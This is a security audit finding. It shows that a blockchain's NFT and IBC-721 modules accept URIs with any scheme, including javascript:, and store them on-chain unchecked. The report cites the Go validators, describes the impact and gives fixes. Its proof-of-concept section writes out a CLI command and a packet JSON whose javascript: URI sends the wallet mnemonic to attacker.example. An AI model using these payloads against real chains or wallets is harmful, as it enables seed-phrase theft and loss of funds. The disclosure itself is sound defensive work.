### Title
Missing URI Protocol Validation Allows Arbitrary Scheme Injection into NFT/Denom On-Chain State — (File: `x/nft/types/validation.go`, `x/nft/types/msgs.go`, `x/nft-transfer/types/packet.go`)

---

### Summary

`ValidateTokenURI` enforces only a length ceiling and no protocol-scheme restriction. `MsgIssueDenom.ValidateBasic()` skips URI validation entirely. `NonFungibleTokenPacketData.ValidateBasic()` never validates `ClassUri` or `TokenUris`. As a result, any unprivileged actor — via a direct `MsgIssueDenom`/`MsgMintNFT` transaction or via an IBC-721 inbound packet — can permanently write arbitrary URI schemes (e.g., `javascript:`, `data:`, `vbscript:`) into the chain's NFT/denom state. Wallets and dApps that consume these on-chain URIs without independent sanitization are exposed to XSS, which in a key-custodying wallet context means full private-key or seed-phrase exfiltration.

---

### Finding Description

**Root cause 1 — `ValidateTokenURI` is scheme-blind**

`x/nft/types/validation.go` defines the only URI check in the module:

```go
func ValidateTokenURI(tokenURI string) error {
    if len(tokenURI) > MaxTokenURILen {
        return sdkerrors.Wrapf(ErrInvalidTokenURI, ...)
    }
    return nil
}
```

It accepts any string ≤ 256 bytes, including `javascript:alert(1)`, `data:text/html,<script>…</script>`, etc. [1](#0-0) 

**Root cause 2 — `MsgIssueDenom.ValidateBasic()` never calls `ValidateTokenURI` on `Uri`**

`MsgMintNFT` and `MsgEditNFT` at least invoke `ValidateTokenURI(msg.URI)`. `MsgIssueDenom` validates only `Id`, `Sender`, and `Name`; the `Uri` field is completely unchecked — no length bound, no scheme restriction:

```go
func (msg MsgIssueDenom) ValidateBasic() error {
    if err := ValidateDenomID(msg.Id); err != nil { return err }
    if _, err := sdk.AccAddressFromBech32(msg.Sender); err != nil { ... }
    return ValidateDenomName(msg.Name)
    // msg.Uri is never validated
}
``` [2](#0-1) 

**Root cause 3 — `NonFungibleTokenPacketData.ValidateBasic()` ignores `ClassUri` and `TokenUris`**

The IBC-721 packet validator checks `ClassId`, token-ID count, `Sender`, and `Receiver`. Neither `ClassUri` nor any element of `TokenUris` is inspected:

```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
    if strings.TrimSpace(nftpd.ClassId) == "" { ... }
    if len(nftpd.TokenIds) == 0 { ... }
    if len(nftpd.TokenIds) != len(nftpd.TokenUris) { ... }
    // ClassUri and TokenUris content: never validated
    ...
}
``` [3](#0-2) 

**Root cause 4 — `processReceivedPacket` writes unvalidated URIs directly into state**

On the IBC receive path, `data.ClassUri` is forwarded verbatim to `IssueDenom` and each `data.TokenUris[i]` to `MintNFT` with no intervening sanitization:

```go
if err := k.nftKeeper.IssueDenom(ctx, voucherClassID, voucherClassID, "", data.ClassUri, escrowAddress); err != nil {
    return err
}
...
if err := k.nftKeeper.MintNFT(ctx, voucherClassID, tokenID, "", data.TokenUris[i], "", escrowAddress, receiver); err != nil {
    return err
}
``` [4](#0-3) 

---

### Impact Explanation

The malicious URI is durably written into the KV-store as part of the `Denom.Uri` or `BaseNFT.URI` field and is returned verbatim by every gRPC/REST query (`QueryDenom`, `QueryNFT`, `QueryCollection`). Any wallet or dApp that renders the URI without independent sanitization — e.g., by passing it to an `<iframe src>`, `<img src>`, or an Angular `bypassSecurityTrustResourceUrl`-equivalent — will execute the injected script in the user's browser context. In a key-custodying wallet this directly enables private-key or seed-phrase exfiltration and therefore complete fund theft from the victim's account. The corrupted on-chain value is the `Denom.Uri` / `BaseNFT.URI` field stored in the NFT module's KV-store.

---

### Likelihood Explanation

**Direct-transaction path**: Any account holding enough gas can submit `MsgIssueDenom` with `Uri: "javascript:…"`. No special role is required; denom creation is permissionless. [5](#0-4) 

**IBC path**: Any counterparty chain (or a chain whose relayer is compromised) can craft a `NonFungibleTokenPacketData` with `ClassUri` or `TokenUris` set to a malicious scheme. Because `ValidateBasic` on the packet never inspects those fields, the packet passes all on-chain checks and `processReceivedPacket` writes the URI into state unconditionally. [6](#0-5) 

Both vectors require only an unprivileged account and a standard signed transaction or IBC relay, making exploitation straightforward.

---

### Recommendation

1. **Extend `ValidateTokenURI`** to reject any URI whose scheme is not `http://` or `https://` (or an explicitly allow-listed set such as `ipfs://`).
2. **Call `ValidateTokenURI` (or an equivalent denom-URI validator) inside `MsgIssueDenom.ValidateBasic()`** for the `Uri` field, mirroring the existing check in `MsgMintNFT` and `MsgEditNFT`.
3. **Add URI validation inside `NonFungibleTokenPacketData.ValidateBasic()`** for both `ClassUri` and every element of `TokenUris`, so that malformed or dangerous URIs are rejected at the IBC packet-receive boundary before they reach `processReceivedPacket`.

---

### Proof of Concept

**Direct transaction vector**

```bash
chain-maind tx nft issue \
  --denom-id  "maliciousdenom" \
  --name      "Evil Denom" \
  --uri       "javascript:fetch('https://attacker.example/steal?k='+localStorage.getItem('mnemonic'))" \
  --from      attacker \
  --chain-id  crypto-org-chain-mainnet-1
```

`MsgIssueDenom.ValidateBasic()` passes (only `Id`, `Sender`, `Name` are checked). The keeper writes the `javascript:` URI into the `Denom.Uri` field. Any subsequent `QueryDenom` response returns the malicious URI verbatim.

**IBC receive vector**

A counterparty chain sends an ICS-721 packet:

```json
{
  "classId":   "transfer/channel-0/legitClass",
  "classUri":  "javascript:fetch('https://attacker.example/steal?k='+localStorage.getItem('mnemonic'))",
  "tokenIds":  ["token1"],
  "tokenUris": ["javascript:fetch('https://attacker.example/steal?k='+localStorage.getItem('mnemonic'))"],
  "sender":    "cosmos1attacker...",
  "receiver":  "cosmos1victim..."
}
```

`NonFungibleTokenPacketData.ValidateBasic()` passes (neither `ClassUri` nor `TokenUris` is inspected). `processReceivedPacket` calls `IssueDenom(..., data.ClassUri, ...)` and `MintNFT(..., data.TokenUris[i], ...)`, permanently storing the `javascript:` URI in chain state. Any wallet that subsequently queries and renders the NFT executes the injected script, exfiltrating the user's seed phrase to the attacker's server.

### Citations

**File:** x/nft/types/validation.go (L77-82)
```go
func ValidateTokenURI(tokenURI string) error {
	if len(tokenURI) > MaxTokenURILen {
		return sdkerrors.Wrapf(ErrInvalidTokenURI, "the length of nft uri(%s) only accepts value [0, %d]", tokenURI, MaxTokenURILen)
	}
	return nil
}
```

**File:** x/nft/types/msgs.go (L46-55)
```go
func (msg MsgIssueDenom) ValidateBasic() error {
	if err := ValidateDenomID(msg.Id); err != nil {
		return err
	}

	if _, err := sdk.AccAddressFromBech32(msg.Sender); err != nil {
		return newsdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, "invalid sender address (%s)", err)
	}
	return ValidateDenomName(msg.Name)
}
```

**File:** x/nft-transfer/types/packet.go (L41-72)
```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
}
```

**File:** x/nft-transfer/keeper/packet.go (L140-185)
```go
func (k Keeper) processReceivedPacket(ctx sdk.Context, packet channeltypes.Packet,
	data types.NonFungibleTokenPacketData,
) error {
	receiver, err := sdk.AccAddressFromBech32(data.Receiver)
	if err != nil {
		return err
	}

	isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)

	// create the escrow address for creating denom and minting nft
	escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())

	if isAwayFromOrigin {
		// since SendPacket did not prefix the classID, we must prefix classID here
		classPrefix := types.GetClassPrefix(packet.GetDestPort(), packet.GetDestChannel())
		// NOTE: sourcePrefix contains the trailing "/"
		prefixedClassID := classPrefix + data.ClassId

		// construct the class trace from the full raw classID
		classTrace := types.ParseClassTrace(prefixedClassID)
		if !k.HasClassTrace(ctx, classTrace.Hash()) {
			k.SetClassTrace(ctx, classTrace)
		}

		voucherClassID := classTrace.IBCClassID()

		if !k.nftKeeper.HasDenomID(ctx, voucherClassID) {
			if err := k.nftKeeper.IssueDenom(ctx, voucherClassID, voucherClassID, "", data.ClassUri, escrowAddress); err != nil {
				return err
			}
		}
		sdkCtx := sdk.UnwrapSDKContext(ctx)
		sdkCtx.EventManager().EmitEvent(
			sdk.NewEvent(
				types.EventTypeClassTrace,
				sdk.NewAttribute(types.AttributeKeyTraceHash, classTrace.Hash().String()),
				sdk.NewAttribute(types.AttributeKeyClassID, voucherClassID),
			),
		)

		for i, tokenID := range data.TokenIds {
			if err := k.nftKeeper.MintNFT(ctx, voucherClassID, tokenID, "", data.TokenUris[i], "", escrowAddress, receiver); err != nil {
				return err
			}
		}
```

**File:** x/nft/keeper/msg_server.go (L25-51)
```go
func (m msgServer) IssueDenom(goCtx context.Context, msg *types.MsgIssueDenom) (*types.MsgIssueDenomResponse, error) {
	sender, err := sdk.AccAddressFromBech32(msg.Sender)
	if err != nil {
		return nil, err
	}

	ctx := sdk.UnwrapSDKContext(goCtx)
	if err := m.Keeper.IssueDenom(ctx, msg.Id, msg.Name, msg.Schema, msg.Uri, sender); err != nil {
		return nil, err
	}

	ctx.EventManager().EmitEvents(sdk.Events{
		sdk.NewEvent(
			types.EventTypeIssueDenom,
			sdk.NewAttribute(types.AttributeKeyDenomID, msg.Id),
			sdk.NewAttribute(types.AttributeKeyDenomName, msg.Name),
			sdk.NewAttribute(types.AttributeKeyCreator, msg.Sender),
		),
		sdk.NewEvent(
			sdk.EventTypeMessage,
			sdk.NewAttribute(sdk.AttributeKeyModule, types.AttributeValueCategory),
			sdk.NewAttribute(sdk.AttributeKeySender, msg.Sender),
		),
	})

	return &types.MsgIssueDenomResponse{}, nil
}
```
